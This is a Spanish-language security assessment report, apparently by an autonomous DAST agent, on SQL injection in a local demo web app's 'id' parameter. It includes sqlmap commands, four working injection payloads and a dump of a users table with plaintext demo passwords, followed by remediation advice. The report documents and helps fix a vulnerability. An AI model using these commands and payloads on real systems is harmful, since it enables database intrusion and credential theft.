# Informe de Análisis de Seguridad - SQL Injection
**Fecha:** 2026-04-27T11:40:10Z  
**Objetivo:** http://web.dev.local:8083  
**Herramientas:** curl, sqlmap 1.10.2  
**Analista:** Agente Autónomo de Seguridad Ofensiva (DAST)

---

## Resumen Ejecutivo

Se realizó un análisis dinámico de seguridad (DAST) sobre la aplicación web disponible en `http://web.dev.local:8083`. Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del método GET. La explotación permitió extraer la base de datos completa de usuarios, incluyendo credenciales en texto plano. La vulnerabilidad se clasifica como **CRÍTICA** (CVSS v3 ~9.8).

---

## Fase 1: Reconocimiento

Se inspeccionó la página principal con `curl`:

- La aplicación presenta un formulario HTML con un campo de búsqueda de usuario por ID.
- El formulario utiliza método **GET** con el parámetro `id`.
- URL de consulta: `http://web.dev.local:8083/?id=<valor>&Submit=Submit`
- Stack tecnológico identificado: **Apache 2.4.65**, **PHP 8.1.33**, **MySQL/MariaDB** (Linux Debian).

**Vector de entrada identificado:**
```
GET /?id=1&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

---

## Fase 2: Descubrimiento (Vulnerability Scanning)

Se ejecutó `sqlmap` con nivel 3 y riesgo 2 sobre el parámetro `id`:

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --level=3 --risk=2
```

### Resultado: **VULNERABLE**

sqlmap confirmó múltiples técnicas de inyección sobre el parámetro `id`:

| Técnica | Título |
|---------|--------|
| Boolean-based blind | AND boolean-based blind - WHERE or HAVING clause (subquery - comment) |
| Error-based | MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (query SLEEP) |
| UNION query | Generic UNION query (NULL) - 2 columns |

**Payloads identificados:**

```sql
-- Boolean-based blind
id=1' AND 4855=(SELECT (CASE WHEN (4855=4855) THEN 4855 ELSE (SELECT 5578 UNION SELECT 1967) END))-- -

-- Error-based
id=1' AND EXTRACTVALUE(7032,CONCAT(0x5c,0x716a7a7671,(SELECT (ELT(7032=7032,1))),0x716b7a6a71)) AND 'VNQE'='VNQE

-- Time-based blind
id=1' AND (SELECT 8779 FROM (SELECT(SLEEP(5)))fHXT) AND 'DaGw'='DaGw

-- UNION query
id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a7671,0x677648566462786877766467765159474a775444736c5a416463474b5574416b48654d424e47426a,0x716b7a6a71)-- -
```

---

## Fase 3: Explotación Activa

### 3.1 Enumeración de base de datos

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --current-user --dbs
```

**Resultados:**
- **Usuario de BD actual:** `root@%` (privilegios máximos)
- **Bases de datos disponibles:**
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### 3.2 Enumeración de tablas

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch -D sqli_demo --tables
```

**Base de datos `sqli_demo`:**
- Tabla: `users`

### 3.3 Volcado de datos (Dump)

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch -D sqli_demo -T users --dump
```

### Evidencia de Explotación — Tabla `sqli_demo.users` (8 registros extraídos):

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava significativamente la criticidad del hallazgo.

---

## Hallazgos

### VULN-001: SQL Injection en parámetro `id` (GET)

| Campo | Valor |
|-------|-------|
| **Severidad** | CRÍTICA |
| **CWE** | CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) |
| **CVSS v3** | ~9.8 |
| **URL afectada** | `http://web.dev.local:8083/?id=<PAYLOAD>&Submit=Submit` |
| **Parámetro vulnerable** | `id` (GET) |
| **DBMS** | MySQL >= 5.1 (MariaDB fork) |
| **Técnicas** | Boolean-based blind, Error-based, Time-based blind, UNION query |
| **Impacto** | Extracción completa de base de datos, acceso root al DBMS |

---

## Conclusión

La aplicación web `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** en el parámetro `id` del endpoint principal. La inyección no está mitigada con ningún tipo de sanitización ni uso de consultas parametrizadas. El atacante puede:

1. **Extraer** toda la información de la base de datos (usuarios, contraseñas en texto plano).
2. **Escalar** hacia otras bases de datos del sistema (mysql, sys, etc.) dado que el usuario de BD es `root`.
3. Potencialmente **leer/escribir archivos** en el sistema operativo si los permisos FILE están habilitados.

### Recomendaciones

- **Inmediata:** Usar **consultas preparadas (Prepared Statements)** o **ORM** en lugar de concatenación directa de SQL.
- **Corto plazo:** Implementar validación y sanitización de entradas (lista blanca de caracteres permitidos).
- **Medio plazo:** Aplicar el principio de mínimo privilegio — el usuario de base de datos no debe ser `root`.
- **Adicional:** Hashear las contraseñas con algoritmos seguros (bcrypt, Argon2) en lugar de almacenarlas en texto plano.
